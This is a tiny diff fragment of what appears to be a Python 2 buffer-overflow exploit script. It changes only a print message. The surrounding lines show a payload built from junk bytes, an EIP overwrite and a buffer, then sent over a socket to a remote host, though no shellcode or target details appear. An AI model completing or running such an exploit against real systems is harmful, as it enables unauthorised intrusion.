@@ -15,6 +15,6 @@ payload = junk + eip + offset + buffer
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect((rhost,rport))
-print "Sending payload..."
+print "Sending: payload"
 s.send(payload)
 s.close()
